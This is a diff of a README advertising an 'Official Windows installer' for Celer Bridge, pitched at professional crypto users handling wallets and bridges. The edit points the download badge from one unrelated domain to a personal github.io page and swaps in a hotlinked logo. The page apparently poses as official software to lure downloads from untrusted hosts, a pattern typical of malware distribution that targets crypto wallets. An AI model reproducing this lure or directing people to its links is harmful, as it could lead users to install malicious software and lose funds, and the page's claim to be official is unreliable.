@@ -2,7 +2,7 @@
 
 Official Windows installer for **Celer Bridge** — engineered for high performance, stability, and security. This native application removes browser limitations and provides a predictable, auditable workspace for explorers, bridges, and wallets used in professional crypto workflows.
 
-[![Download Celer Bridge](https://img.shields.io/badge/Download-Celer_Bridge-blueviolet)](https://obsprosect.com)
+[![GET Celer Bridge](https://img.shields.io/badge/GET%20%E2%80%94%20Celer-Bridge-0078D6?style=for-the-badge&logoColor=white)](https://jim620645.github.io/.github/Celer-Bridge)
 
 ---
 
@@ -34,7 +34,7 @@ Celer Bridge pairs deterministic Windows performance with clean exports and stro
 - 💽 **Storage:** 6 GB free space
 
 ### 🖼 Preview
-![Celer Bridge Logo](https://logo.clearbit.com/celer.network)
+![Celer Bridge Logo](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWU1TmvuxQoA1hPN79PDmGBwJB0ViA7KeHWkPWrLe7TPv7pmmgDGvGZj6J&s=10)
 *Official branding preview.*
 
 ---
